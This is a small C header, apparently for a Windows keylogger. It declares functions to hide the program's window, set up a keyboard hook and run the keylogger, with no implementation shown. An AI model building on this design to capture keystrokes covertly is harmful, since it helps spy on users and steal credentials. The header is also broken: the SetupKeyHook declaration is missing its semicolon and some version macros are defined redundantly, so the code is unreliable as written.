#ifndef __WINKEY_H__
#define __WINKEY_H__

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0A00
#define NTDDI_VERSION 0x0A000000

#ifndef WINVER
#define WINVER 0x0A00           // Windows 10
#endif

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0A00     // Windows 10
#endif

#ifndef NTDDI_VERSION
#define NTDDI_VERSION NTDDI_WIN10
#endif


#include <stdio.h>
#include <windows.h>
#include <errno.h>
#include <winuser.h>
#include <libloaderapi.h>
#include <stdbool.h>


/* Window */
void    HideWindow(void);

/* Key Hook */
void    SetupKeyHook()
bool    Keylogger();

#endif